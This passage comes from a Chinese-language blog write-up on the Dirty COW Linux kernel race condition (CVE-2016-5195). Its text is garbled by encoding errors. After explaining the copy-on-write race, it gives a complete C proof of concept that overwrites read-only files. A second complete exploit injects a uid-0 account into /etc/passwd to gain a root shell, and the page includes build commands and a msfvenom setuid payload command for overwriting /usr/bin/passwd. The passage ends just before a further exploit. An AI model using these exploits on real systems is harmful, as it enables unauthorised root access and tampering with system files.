<p>ç”±äºè¿™ä¸€æ¬¡æˆåŠŸè·å–åˆ°äº†ä¸€ä¸ªå¯å†™çš„å†…å­˜é¡µï¼Œæ­¤æ—¶ <code>faultin_page()</code> å‡½æ•°ä¼šæ¸…é™¤ <code>foll_flags</code> çš„ <code>FOLL_WRITE</code> æ ‡å¿—ä½</p>
<p>å¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">faultin_page()</span><br><span class="line">    handle_mm_fault()</span><br><span class="line">        __handle_mm_fault()</span><br><span class="line">            handle_pte_fault()</span><br><span class="line">                do_wp_page()</span><br><span class="line">                	reuse_swap_page(old_page)</span><br><span class="line">                		wp_page_reuse()</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥çš„æµç¨‹æœ€ç»ˆå›åˆ° <code>__get_user_pages()</code> çš„ retry æ ‡ç­¾ï¼Œ<strong>ç¬¬ä¸‰æ¬¡</strong>å°è¯•è·å–å†…å­˜é¡µï¼Œæ­¤æ—¶ <code>foll_flags</code> çš„ <code>FOLL_WRITE</code> æ ‡å¿—ä½å·²ç»è¢«æ¸…é™¤ï¼Œ<strong>å†…æ ¸è®¤ä¸ºè¯¥é¡µå¯å†™</strong>ï¼Œäºæ˜¯ <code>follow_page_mask()</code> å‡½æ•°æˆåŠŸè·å–åˆ°è¯¥å†…å­˜é¡µï¼Œæ¥ä¸‹æ¥ä¾¿æ˜¯å¸¸è§„çš„å†™å…¥æµç¨‹ï¼Œ COW ç»“æŸ</p>
<h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><p>æ—¢ç„¶CVE-2016-5195ä¿—ç§°<strong>ã€ŒdirtyCOWã€</strong>ï¼Œæ¯«æ— ç–‘é—®æ¼æ´å‡ºç°åœ¨ COW çš„è¿‡ç¨‹å½“ä¸­ï¼Œç°åœ¨è®©æˆ‘ä»¬æ¥é‡æ–°å®¡è§†æ•´ä¸ª COW çš„è¿‡ç¨‹</p>
<h3 id="å¤šçº¿ç¨‹ç«äº‰"><a href="#å¤šçº¿ç¨‹ç«äº‰" class="headerlink" title="å¤šçº¿ç¨‹ç«äº‰"></a>å¤šçº¿ç¨‹ç«äº‰</h3><p>æˆ‘ä»¬åœ¨é€šè¿‡ <code>follow_page_mask()</code> å‡½æ•°è·å–å¯¹åº”çš„å†…å­˜é¡µä¹‹å‰ï¼Œç”¨ä»¥åˆ¤æ–­è¯¥å†…å­˜é¡µæ˜¯å¦å¯å†™çš„é€»è¾‘æ˜¯æ ¹æ® <code>foll_flags</code> çš„ <code>FOLL_WRITE</code> æ ‡å¿—ä½è¿›è¡Œåˆ¤æ–­çš„ï¼Œä½†æ˜¯å†³å®š ä»è¯¥å†…å­˜é¡µè¯»å‡ºæ•°æ®&#x2F;å‘è¯¥å†…å­˜é¡µå†™å…¥æ•°æ® åˆ™æ˜¯ç”±ä¼ å…¥ç»™ <code>mem_rw()</code> å‡½æ•°çš„å‚æ•° <code>write</code> å†³å®šçš„</p>
<p>æˆ‘ä»¬æ¥æ€è€ƒå¦‚ä¸‹ç«äº‰è¿‡ç¨‹ï¼Œå‡å¦‚æˆ‘ä»¬å¯åŠ¨äº†ä¸¤ä¸ªçº¿ç¨‹ï¼š</p>
<ul>
<li>[1] ç¬¬ä¸€ä¸ªçº¿ç¨‹å°è¯•å‘<strong>ã€Œä»…å…·æœ‰è¯»æƒé™çš„mmapæ˜ å°„åŒºåŸŸå†™å…¥å†…å®¹ã€</strong>ï¼Œæ­¤æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œè¿›å…¥åˆ°å†™æ—¶å¤åˆ¶ï¼ˆCOWï¼‰çš„æµç¨‹å½“ä¸­</li>
<li>[2] ç¬¬äºŒä¸ªçº¿ç¨‹ä½¿ç”¨ <code>madvise()</code> å‡½æ•°é€šçŸ¥å†…æ ¸<strong>ã€Œç¬¬ä¸€ä¸ªçº¿ç¨‹è¦å†™å…¥çš„é‚£å—åŒºåŸŸæ ‡ä¸ºæœªä½¿ç”¨ã€</strong>ï¼Œæ­¤æ—¶ç”± COW åˆ†é…å¾—åˆ°çš„æ–°å†…å­˜é¡µå°†ä¼šè¢«å†æ¬¡è°ƒå‡º</li>
</ul>
<h3 id="å››æ¬¡è·å–å†…å­˜é¡µ-amp-ä¸‰æ¬¡ç¼ºé¡µå¼‚å¸¸"><a href="#å››æ¬¡è·å–å†…å­˜é¡µ-amp-ä¸‰æ¬¡ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="å››æ¬¡è·å–å†…å­˜é¡µ &amp; ä¸‰æ¬¡ç¼ºé¡µå¼‚å¸¸"></a>å››æ¬¡è·å–å†…å­˜é¡µ &amp; ä¸‰æ¬¡ç¼ºé¡µå¼‚å¸¸</h3><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæ—¢ç„¶è¿™ä¸¤ä¸ªçº¿ç¨‹è·‘åœ¨ç«äº‰æ€ï¼Œåœ¨ç¬¬ä¸€ä¸ªçº¿ç¨‹èµ°å®Œä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸çš„æµç¨‹ä¹‹åï¼Œè‹¥æ˜¯ç¬¬äºŒä¸ªçº¿ç¨‹è°ƒç”¨ madvise() å°†é¡µè¡¨é¡¹ä¸­çš„è¯¥é¡µå†æ¬¡è°ƒå‡ºï¼Œ<strong>ç¬¬ä¸€ä¸ªçº¿ç¨‹åœ¨ç¬¬ä¸‰æ¬¡å°è¯•è·å–å†…å­˜é¡µæ—¶ä¾¿æ— æ³•è·å–åˆ°å†…å­˜é¡µï¼Œä¾¿ä¼šå†æ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸</strong>ï¼Œæ¥ä¸‹æ¥è¿›å…¥åˆ° <code>faultin_page()</code> çš„æµç¨‹è·å–åŸå†…å­˜é¡µ</p>
<p>è€Œ <code>__get_user_pages()</code> å‡½æ•°ä¸­ <code>foll_flags</code> çš„ <code>FOLL_WRITE</code> æ ‡å¿—ä½å·²ç»<strong>åœ¨ç¬¬äºŒæ¬¡å°è¯•è·å–å†…å­˜é¡µã€ç¬¬äºŒæ¬¡è§¦å‘ç¼ºé¡µå¼‚å¸¸</strong>è¢«æ¸…é™¤ï¼Œ æ­¤æ—¶è¯¥å‡½æ•° <strong>ç¬¬å››æ¬¡å°è¯•è·å–å†…å­˜é¡µ</strong>ï¼Œç”±äºä¸å­˜åœ¨æ ‡å¿—ä½çš„å†²çªï¼Œ<strong>ä¾¿å¯ä»¥ â€œæ­£å¸¸â€ è·å–åˆ°å†…å­˜é¡µ</strong></p>
<p>æ¥ä¸‹æ¥ä¾¿å›åˆ°äº† <code>mem_rw()</code>çš„å†™æµç¨‹ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¾¿æˆåŠŸç»•è¿‡äº† <code>foll_flags</code>å¯¹äºè¯»å†™çš„æ£€æµ‹ï¼ŒæˆåŠŸè·å–åˆ°åªæœ‰è¯»æƒé™çš„å†…å­˜é¡µï¼Œ<strong>å®Œæˆè¶Šæƒå†™</strong></p>
<h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>æœ‰äº†ä»¥ä¸Šæ€è·¯ï¼Œæˆ‘ä»¬çš„ POC å¹¶ä¸ç®—ç‰¹åˆ«éš¾å†™ï¼Œ<strong>å¼€ä¸¤ä¸ªçº¿ç¨‹æ¥ç«äº‰</strong>å³å¯</p>
<p>æˆ‘ä»¬å…ˆé€šè¿‡ mmap ä»¥åªè¯»æƒé™æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ï¼Œéšåå°è¯•é€šè¿‡ <code>/proc/self/mem</code> æ–‡ä»¶ç›´æ¥å‘è¿›ç¨‹çš„å¯¹åº”å†…å­˜åŒºåŸŸå†™å…¥ï¼Œè¿™æ ·ä¾¿å¯ä»¥æ— è§† mmap è®¾å®šçš„æƒé™è¿›è¡Œå†™å…¥ï¼Œä»è€Œè§¦å‘ COW</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>å®Œæ•´ POC å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * poc by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.4.14</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">dst_st</span>, <span class="title">fk_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_content;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./poc destination_file fake_file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dst_fd, fk_fd;</span><br><span class="line">    dst_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">    fk_fd = open(argv[<span class="number">2</span>], O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of dst: %d\nfd of fk: %d\n&quot;</span>, dst_fd, fk_fd);</span><br><span class="line"></span><br><span class="line">    fstat(dst_fd, &amp;dst_st); <span class="comment">// get destination file length</span></span><br><span class="line">    fstat(fk_fd, &amp;fk_st); <span class="comment">// get fake file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fake_content = <span class="built_in">malloc</span>(fk_st.st_size);</span><br><span class="line">    read(fk_fd, fake_content, fk_st.st_size);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_content, fk_st.st_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸä¿®æ”¹åªè¯»æ–‡ä»¶</p>
<p><img src="https://i.loli.net/2021/04/14/KBuysmMaRiToVHc.png" alt="image.png"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="ä¸€ã€æ–°å»º-root-ç”¨æˆ·"><a href="#ä¸€ã€æ–°å»º-root-ç”¨æˆ·" class="headerlink" title="ä¸€ã€æ–°å»º root ç”¨æˆ·"></a>ä¸€ã€æ–°å»º root ç”¨æˆ·</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ <code>/etc/passwd</code> è¿™ä¸ªæ–‡ä»¶çš„æ–¹å¼å‘å…¶ä¸­æ·»åŠ ä¸€ä¸ª uid ä¸º 0 çš„æ–°ç”¨æˆ·ï¼Œä¹‹åå†ç™»å…¥è¿™ä¸ªç”¨æˆ·å³å¯å®Œæˆææƒæ‹¿åˆ° root shellï¼Œå…·ä½“çš„æ„é€ è¿‡ç¨‹å°±ä¸åœ¨æ­¤èµ˜å™äº†</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * CVE-2016-5195</span></span><br><span class="line"><span class="comment"> * dirty C-O-W</span></span><br><span class="line"><span class="comment"> * exploit by arttnba3</span></span><br><span class="line"><span class="comment"> * 2021.5.24</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">passwd_st</span>;</span></span><br><span class="line"><span class="type">void</span> * <span class="built_in">map</span>;</span><br><span class="line"><span class="type">char</span> *fake_user;</span><br><span class="line"><span class="type">int</span> fake_user_length;</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> write_thread, madvise_thread;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> *username;</span><br><span class="line">    <span class="type">char</span> *hash;</span><br><span class="line">    <span class="type">int</span> user_id;</span><br><span class="line">    <span class="type">int</span> group_id;</span><br><span class="line">    <span class="type">char</span> *info;</span><br><span class="line">    <span class="type">char</span> *home_dir;</span><br><span class="line">    <span class="type">char</span> *shell;</span><br><span class="line">&#125;hacker = </span><br><span class="line">&#123;</span><br><span class="line">    .user_id = <span class="number">0</span>,</span><br><span class="line">    .group_id = <span class="number">0</span>,</span><br><span class="line">    .info = <span class="string">&quot;a3pwn&quot;</span>,</span><br><span class="line">    .home_dir = <span class="string">&quot;/root&quot;</span>,</span><br><span class="line">    .shell = <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> passwd_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./dirty username password&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do not forget to make a backup for the /etc/passwd by yourself&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hacker.username = argv[<span class="number">1</span>];</span><br><span class="line">    hacker.hash = crypt(argv[<span class="number">2</span>], argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    fake_user_length = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>, </span><br><span class="line">        hacker.username, </span><br><span class="line">        hacker.hash, </span><br><span class="line">        hacker.user_id, </span><br><span class="line">        hacker.group_id, </span><br><span class="line">        hacker.info, </span><br><span class="line">        hacker.home_dir, </span><br><span class="line">        hacker.shell);</span><br><span class="line">    fake_user = (<span class="type">char</span> * ) <span class="built_in">malloc</span>(fake_user_length + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(fake_user, <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>, </span><br><span class="line">        hacker.username, </span><br><span class="line">        hacker.hash, </span><br><span class="line">        hacker.user_id, </span><br><span class="line">        hacker.group_id, </span><br><span class="line">        hacker.info, </span><br><span class="line">        hacker.home_dir, </span><br><span class="line">        hacker.shell);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    passwd_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of /etc/passwd: %d\n&quot;</span>, passwd_fd);</span><br><span class="line"></span><br><span class="line">    fstat(passwd_fd, &amp;passwd_st); <span class="comment">// get /etc/passwd file length</span></span><br><span class="line">    <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;madvise_thread, <span class="literal">NULL</span>, madviseThread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;write_thread, <span class="literal">NULL</span>, writeThread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pthread_join(madvise_thread, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(write_thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">writeThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mm_fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd of mem: %d\n&quot;</span>, mm_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        lseek(mm_fd, (<span class="type">off_t</span>) <span class="built_in">map</span>, SEEK_SET);</span><br><span class="line">        write(mm_fd, fake_user, fake_user_length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * <span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> * argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">        madvise(<span class="built_in">map</span>, <span class="number">0x100</span>, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>crypt() ä¸ºéæ ‡å‡†åº“å‡½æ•°ï¼Œç¼–è¯‘çš„æ—¶å€™éœ€è¦åŠ ä¸Š <code>-lcrypt</code> å‚æ•°</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc dirty.c -o dirty -static -lpthread -lcrypt</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸæ‹¿åˆ° root shell</p>
<p><img src="https://i.loli.net/2021/05/24/2fU3GIw7W8BoTMe.png" alt="image.png"></p>
<h3 id="äºŒã€SUID-ææƒ"><a href="#äºŒã€SUID-ææƒ" class="headerlink" title="äºŒã€SUID ææƒ"></a>äºŒã€SUID ææƒ</h3><p>æ—¢ç„¶æœ‰äº†ä»»æ„æ–‡ä»¶è¯»å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€äº›å…·æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶ï¼ˆSUID&#x2F;SGIDï¼Œå³è¢«è®¾å®šå¥½å…¶æ‰§è¡Œç”¨æˆ·ï¼ˆç»„ï¼‰æƒé™çš„ä¸€äº›æ–‡ä»¶ï¼Œå¦‚ <code>/usr/bin/passwd</code>ï¼‰ï¼Œå°†å…¶æ”¹å†™ä¸ºæˆ‘ä»¬æ„é€ å¥½çš„ç‰¹å®šä»£ç ï¼Œæˆ‘ä»¬åœ¨æ‰§è¡Œæ—¶å°±èƒ½å®Œæˆææƒ</p>
<p>ç¬”è€…è¿™é‡Œé€‰æ‹©æ”¹å†™ <code>/usr/bin/passwd</code> ä»¥å®Œæˆææƒï¼Œå› ä¸ºè¿™ä¸ªç¨‹åºæœ‰ç€ root çš„æ‰§è¡Œæƒé™</p>
<p>åœ¨è¿™é‡Œç¬”è€…é€‰æ‹©ä½¿ç”¨ <code>msfvenom</code> è¿™ä¸€ä¸ªå·¥å…·æ„é€  payloadï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i</span><br></pre></td></tr></table></figure>

<p>exp å¦‚ä¸‹ï¼š</p>
